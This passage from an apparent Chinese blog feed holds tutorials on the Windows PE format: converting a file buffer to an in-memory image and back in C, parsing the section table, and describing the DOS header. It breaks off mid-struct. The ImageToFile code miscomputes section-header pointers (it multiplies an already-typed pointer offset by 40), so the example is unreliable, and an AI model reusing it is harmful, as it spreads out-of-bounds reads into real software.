    <content type="html"><![CDATA[<p>PE练习，FileBuffer–ImageBuffer–FileBuffer</p><span id="more"></span><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>目前我们已经知道PE文件结构大致组成部分，即</p><ul><li><p>DOS头，主要成员</p><ul><li>MZ标志</li><li>e_lfanew NT头的文件偏移</li></ul><p>NT头又可以分为三个部分 Signature 标准PE头 可选PE头</p></li><li><p>Signature，即“PE”标识</p></li><li><p>标准PE头，主要成员</p><ul><li>Machine 可运行的CPU</li><li>NumberOfSections 节区数量</li><li>TimeDateStamp 时间戳</li><li>Characteristics 文件属性</li></ul></li><li><p>可选PE头主要成员</p><ul><li>Magic PE类型 32位 or 64位？</li><li>AddressOfEntryPoint 程序入口RVA</li><li>ImageBase 程序优先装载地址</li><li>SectionAlignment 内存对齐粒度</li><li>FileAlignment 文件对齐粒度</li><li>SizeOfImage 内存中PE文件映像大小</li><li>SizeOfHeaders 所有头包括节表按文件对齐后的大小</li></ul></li><li><p>节表</p><ul><li>BYTE 8字节名字</li><li>Misc 在内存中真实大小</li><li>VirtualAddress 内存中偏移 即RVA</li><li>SizeOfRawData 文件对齐后尺寸</li><li>PointerToRawData 节区在文件中偏移</li><li>Characteristics 节区属性</li></ul></li></ul><p>实际上这些部分就已经可以决定一个PE文件的全部的东西了，可以通过头找到节表，由节表找到每一个节区，每一个节区就存放了运行时的信息。</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>将一个EXE文件从文件形式拉伸成内存形式，再由内存形式压缩回文件形式，存盘后能运行</p><p>note：这里的内存是指由malloc分配的堆空间地址，不是程序ImageBase的地址</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307012317292.png"></p><h3 id="需要解决的问题"><a href="#需要解决的问题" class="headerlink" title="需要解决的问题"></a>需要解决的问题</h3><p>Q1：要拷贝的数据在哪</p><p>A1：各种头的数据在FileBuffer最前面，而且紧紧相连，中间没有空，同时大小由SizeOfHeaders决定；节区地址可以由节表中的PointerToRawData找到</p><p>Q2：要分配多少空间来存储copy数据</p><p>A2：在可选PE头中有一个<code>SizeOfImage </code>成员，它决定了在内存中PE文件的大小，因此分配<code>SizeOfImage </code>空间即可</p><p>Q3：要把数据copy去哪里</p><p>A3：各种头的数据可以直接copy到ImageBuffer的前面，节区地址可以由节表中每一个结构体的<code>VirtualAddress</code>决定</p><p>同理从ImageBuffer拷贝到FileBuffer时，头部数据也不变，节区地址则可由节表中的<code>PointerToRawData </code>决定</p><p>Q4：节区大小如何确定</p><p>A4：节区大小可与节表两个成员相关，第一个是Misc，第二个是SizeOfRawData。从图中可能会觉得SizeOfRawData一定大于Misc，其实并不一定。考虑这个情形，在编写程序时，仅声明一个全部变量<code>char ch[1000]</code>而并不初始化，那么在文件中就不会为这个变量分配空间存储，只有在内存中时才会分配。而Misc所指的大小就是在内存中的大小，那么这时候Misc就有可能大于SizeOfRawData</p><p>那么是不是谁大用谁呢？也不是，还是以刚刚为例，如果执意使用Misc作为要copy的节区大小，由于在文件中并没有为其分配大小，那么这时候就有可能会把下一个节区数据也copy进来，这就乱套了。</p><p>所以最终答案就是，用小的，或者只用SizeOfRawData，这样能保证精确地把该节区数据全部正确copy，即使还要需要内存，那么也是紧跟已copy数据之后，而且下一个节区地VirtualAddress保证了有足够空间</p><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">FileToImage</span><span class="hljs-params">(<span class="hljs-type">char</span>* filebuffer)</span>&#123;<br><br>    <span class="hljs-comment">//定义一些指针</span><br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">char</span>* TemBuffer = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//简单判断有效性</span><br>    <span class="hljs-keyword">if</span> (!filebuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid buffer!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (*(PWORD)filebuffer != IMAGE_DOS_SIGNATURE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;not a PE file!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-comment">//开始赋值相应指针</span><br>    DosHeader = (PIMAGE_DOS_HEADER)filebuffer;<br>NTHeader = (PIMAGE_NT_HEADERS)  (filebuffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//申请内存中大小</span><br>TemBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(OptionalHeader-&gt;SizeOfImage);<br><br>    <span class="hljs-comment">//初始化并复制头部数据</span><br>    <span class="hljs-built_in">memset</span>(TemBuffer,<span class="hljs-number">0</span>,OptionalHeader-&gt;SizeOfImage);<br>    <span class="hljs-built_in">memcpy</span>(TemBuffer,DosHeader,OptionalHeader-&gt;SizeOfHeaders);<br><br>    <span class="hljs-comment">//开始复制节区数据</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections;i++)&#123;<br>        <span class="hljs-built_in">memcpy</span>((TemBuffer + SectionHeader-&gt;VirtualAddress),(filebuffer + SectionHeader-&gt;PointerToRawData),SectionHeader-&gt;SizeOfRawData);<br><span class="hljs-comment">//更新为下一个节区的结构体，此方式为重新计算</span><br>SectionHeader = (PIMAGE_SECTION_HEADER)(filebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader + <span class="hljs-number">40</span> * (i + <span class="hljs-number">1</span>));<br>        <span class="hljs-comment">// 也可以使用这种方式更新，此方式为相对当前结构体计算</span><br>        <span class="hljs-comment">// 注意C语言中指针加法规则，这里加1指的是加1一个这个结构体大小</span><br>        <span class="hljs-comment">// SectionHeader +=1 ;</span><br><br>&#125;<br><br>    <span class="hljs-keyword">return</span> TemBuffer;<br>&#125;<br><br><span class="hljs-comment">//==========================image to file==========================</span><br><span class="hljs-type">char</span>* <span class="hljs-title function_">ImageToFile</span><span class="hljs-params">(<span class="hljs-type">char</span>* imagebuffer)</span>&#123;<br><br><span class="hljs-comment">//定义一些指针</span><br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FileHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">char</span>* TemBuffer = <span class="hljs-literal">NULL</span>;<br><br><br><span class="hljs-keyword">if</span> (!imagebuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Invalid buffer!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (*(PWORD)imagebuffer != IMAGE_DOS_SIGNATURE)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;not a PE file!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>DosHeader = (PIMAGE_DOS_HEADER)imagebuffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(imagebuffer + DosHeader-&gt;e_lfanew);<br>FileHeader = (PIMAGE_FILE_HEADER)(imagebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(imagebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(imagebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-comment">//计算原文件大小用于分配空间</span><br>DWORD new_size = OptionalHeader-&gt;SizeOfHeaders;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; FileHeader-&gt;NumberOfSections; i++)<br>&#123;<br>new_size += (SectionHeader + IMAGE_SIZEOF_SECTION_HEADER * i)-&gt;SizeOfRawData;<br>&#125;<br><br>TemBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(new_size);<br><br><span class="hljs-comment">//初始化TemBuffer及头部</span><br><span class="hljs-built_in">memset</span>(TemBuffer, <span class="hljs-number">0</span>, new_size);<br><span class="hljs-built_in">memcpy</span>(TemBuffer, imagebuffer, OptionalHeader-&gt;SizeOfHeaders);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; FileHeader-&gt;NumberOfSections; i++)<br>&#123;<br><span class="hljs-built_in">memcpy</span>((TemBuffer + SectionHeader-&gt;PointerToRawData), (imagebuffer + SectionHeader-&gt;VirtualAddress), SectionHeader-&gt;SizeOfRawData);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(imagebuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader + <span class="hljs-number">40</span> * (i + <span class="hljs-number">1</span>));<br>        <span class="hljs-comment">//同理可用  SectionHeader +=1 ;</span><br>&#125;<br><br><span class="hljs-keyword">return</span> TemBuffer;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br> <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>FILE* fp2 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-type">errno_t</span> err_2 = fopen_s(&amp;fp2, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\PE_info_changed.exe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><br>    <span class="hljs-comment">//将exe读入内存，是filebuffer形式</span><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br><span class="hljs-type">char</span>* newbuffer;<br>newbuffer = FileToImage(buffer);<br>newbuffer = ImageToFile(newbuffer);<br><br>fwrite(newbuffer,size,<span class="hljs-number">1</span>,fp2);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构（二）</title>
    <link href="/2023/07/01/PE_1/"/>
    <url>/2023/07/01/PE_1/</url>
    
    <content type="html"><![CDATA[<p>PE文件结构（二） 节表</p><span id="more"></span><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><p>在此之前，我们已经知道PE文件结构前面几部分是由DOS头（通常把DOS stub也算入DOS头中）、NT头，NT头又可以分为Signature、标准PE头、可选PE头，紧接着可选PE头的就是节表。</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307010213266.png"></p><h3 id="节表"><a href="#节表" class="headerlink" title="节表"></a>节表</h3><h4 id="节表的索引"><a href="#节表的索引" class="headerlink" title="节表的索引"></a>节表的索引</h4><p>在解析节表之前，我们首先要知道如何在文件中找到这个节表</p><p>根据PE结构图有一个很朴素的思想去找到这个节表在文件中位置，即节表地址 &#x3D; DOS头大小+Signature大小+标准PE头大小+可选PE头大小即可，然而借助于DOS头中 <code>e_lfanew</code> 字段我们可以直接跳到Signature处，此时变成 <code>e_lfanew</code> + Signature大小 +标准PE头大小+可选PE头大小</p><p>其中Signature大小是4个字节（PE的标识），标准PE头大小是固定的0x14字节，标准PE头中又有 <code>SizeOfOptionalHeader</code>字段标识可选头大小，所以节表地址就可以表示为 <code>e_lfanew + 4 + 0x14 + SizeofOptionalHeader</code></p><h4 id="节区数量"><a href="#节区数量" class="headerlink" title="节区数量"></a>节区数量</h4><p>既然提到了表，就说明这是一个线性结构，像一个数组一样存储了若干小表的信息，这个小表其实就是一个结构体，也即图中的<code>Image_Section_Table</code>,自然大小也就是确定的。每一个结构体都包含了对应节区的相关信息，比如节区的名字、大小等。我们现在可以找到节表，但是怎么确定这个节表中有多少个<code>Image_Section_Table</code>呢</p><p>这就又要回想到之前的标准PE头，里面有一个字段<code>NumberOfSections</code>,顾名思义，就是存储了节表的数量。</p><p>那么现在有了节表的起始位置，又有了节区的数量，节表的大小，尽管不知道节表里的结构体都有什么成员，但是最起码现在可以确定每一个结构体的起始终止了</p><h4 id="结构体成员"><a href="#结构体成员" class="headerlink" title="结构体成员"></a>结构体成员</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_SECTION_HEADER</span> &#123;</span><br>    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];<span class="hljs-comment">//8个字节 IMAGE_SIZEOF_SHORT_NAME是宏 等于8 一般是ascii码 节区名字</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>            DWORD   PhysicalAddress;<br>            DWORD   VirtualSize;<br>    &#125; Misc;<span class="hljs-comment">// 注意是联合体，其含义是没有对齐的在内存中真实尺寸 该值可以不准确</span><br>    DWORD   VirtualAddress;<span class="hljs-comment">// 节区在内存中的偏移地址，是RVA</span><br>    DWORD   SizeOfRawData;<span class="hljs-comment">// 节区在文件中对齐后的尺寸</span><br>    DWORD   PointerToRawData;<span class="hljs-comment">// 节区在文件中偏移</span><br>    DWORD   PointerToRelocations;<span class="hljs-comment">// 在obj文件中使用 对exe无意义</span><br>    DWORD   PointerToLinenumbers;<span class="hljs-comment">// 行号表的位置 调试时使用</span><br>    WORD    NumberOfRelocations;<span class="hljs-comment">// 在obj中使用 对exe无意义</span><br>    WORD    NumberOfLinenumbers;<span class="hljs-comment">// 行号表的数量 调试时使用</span><br>    DWORD   Characteristics;<span class="hljs-comment">// 节区属性 可写可读可执行等 通过或的形式来添加属性</span><br>    <span class="hljs-comment">//0x00000020 含可执行代码 0x20000000 该块可执行 0x40000000 可读 0x80000000 可写</span><br>&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;<br><br></code></pre></td></tr></table></figure><p>以一个对比图来说明</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307010246517.png"></p><p>左边是文件形式，右边是运行时形式</p><ul><li>Name - 从A开始的8个字节是名字</li><li>Misc - 从A到B的大小，可以不准确</li><li>VirtualAddress - 右图中 ImageBase到A的距离</li><li>SizeOfRawData - 左图中绿色框的大小</li><li>PointerToRawData - 左图中0到A的距离</li></ul><h3 id="代码查找"><a href="#代码查找" class="headerlink" title="代码查找"></a>代码查找</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;windows.h&gt;</span></span><br><br>DWORD <span class="hljs-title function_">Size</span><span class="hljs-params">(FILE* fp)</span>&#123;<br>    DWORD size = <span class="hljs-number">0</span>;<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_END);<br>    size = ftell(fp);<br>    fseek(fp,<span class="hljs-number">0</span>,SEEK_SET);<br>    <span class="hljs-keyword">return</span> size;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Section_Info</span><span class="hljs-params">(FILE* fp,<span class="hljs-type">char</span>* buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_FILE_HEADER FileHeader= <span class="hljs-literal">NULL</span>;<br>    PIMAGE_OPTIONAL_HEADER OptionalHeader = <span class="hljs-literal">NULL</span>;<br>    PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    DosHeader = (PIMAGE_DOS_HEADER)buffer;<br>    NTHeader = (PIMAGE_NT_HEADERS)(buffer + DosHeader-&gt;e_lfanew);<br>    FileHeader = (PIMAGE_FILE_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>    OptionalHeader = (PIMAGE_OPTIONAL_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER);<br>    SectionHeader = (PIMAGE_SECTION_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;=================Section PE_INFO=================\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections;i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The %dth sec\n&quot;</span>,i+<span class="hljs-number">1</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;name:%s\n&quot;</span>,SectionHeader-&gt;Name);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VitualAddress:%08x\n&quot;</span>, SectionHeader-&gt;VirtualAddress);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SizeOfRawData:%08x\n&quot;</span>, SectionHeader-&gt;SizeOfRawData);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;PointerToRawRata:%08x\n&quot;</span>, SectionHeader-&gt;PointerToRawData);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Characteristic:%X\n&quot;</span>, SectionHeader-&gt;Characteristics);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;==================================\n&quot;</span>);<br>        SectionHeader = (PIMAGE_SECTION_HEADER)(buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader + <span class="hljs-number">40</span> * (i + <span class="hljs-number">1</span>));<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br><br>    FILE* fp = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp, <span class="hljs-string">&quot;YOU PATH TO EXE HERE&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <br>    DWORD size = Size(fp);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp);<br><br>    Section_Info(fp,buffer);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE文件结构（一）</title>
    <link href="/2023/06/30/PE_0/"/>
    <url>/2023/06/30/PE_0/</url>
    
    <content type="html"><![CDATA[<p> PE文件结构（一）DOS头 NT头</p><span id="more"></span><h2 id="总起"><a href="#总起" class="headerlink" title="总起"></a>总起</h2><p>首先我们需要知道PE是什么。PE，即Portable Executable，也就是Windows下的可执行文件，它包括exe文件，也包括dll、sys文件等，当我们使用十六进制文本编辑器打开一些exe文件时，会得到如下样子</p><p>如图是百度网盘的前面一小撮的部分</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306301414772.png"></p><p>当我们打开其他的exe文件时，这一小撮内容应当是差不多的。这其实就说明这些PE文件应当具有某种格式。我们不妨先看看整个PE文件结构图</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202306301334680.png"></p><p>当我们只看最上面一行，可以发现PE文件大致分为如下几部分</p><ul><li>IMGAE_DOS_HEADR - DOS头</li><li>DOS STUB - DOS填充</li><li>IMAGE_NT_HEADR - NT头</li><li>SECTION_TABLE - 节表</li><li>SECTIONS - 节&#x2F;节区</li><li>OTHERS</li></ul><p>在上面给出的百度网盘的文件格式中，所展现的就是DOS头+DOS填充部分。可能你会有个问题，即</p><ul><li>这些部分有什么含义？</li><li>哪个部分在哪里开始哪里结束呢？</li></ul><p>不急 ，这里先给出整个PE文件结构的图</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202310130834634.jpg"></p><p>可以看到在上面那个图中，又引申出许多小表，其实这些小表就是一个一个结构体，存储在PE文件结构中。可以这么说：PE文件结构就是由许许多多的结构体组成，每个结构体里的每个成员都有相应的含义，比如指示哪个部分的开始，哪个部分的结束，在指来指去的过程中，整个文件运行所需要的信息也就明确了。</p><h2 id="DOS头"><a href="#DOS头" class="headerlink" title="DOS头"></a>DOS头</h2><p>我们先来看看DOS头部分的结构体吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//注释掉的不需要重点分析</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_DOS_HEADER</span>&#123;</span><br>    <span class="hljs-number">0X00</span> WORD e_magic;      <span class="hljs-comment">//※Magic DOS signature MZ(4Dh 5Ah):MZ标记:用于标记是否是可执行文件</span><br>    <span class="hljs-comment">//0X02 WORD e_cblp;     //Bytes on last page of file</span><br>    <span class="hljs-comment">//0X04 WORD e_cp;       //Pages in file</span><br>    <span class="hljs-comment">//0X06 WORD e_crlc;     //Relocations</span><br>    <span class="hljs-comment">//0X08 WORD e_cparhdr;  //Size of header in paragraphs</span><br>    <span class="hljs-comment">//0X0A WORD e_minalloc; //Minimun extra 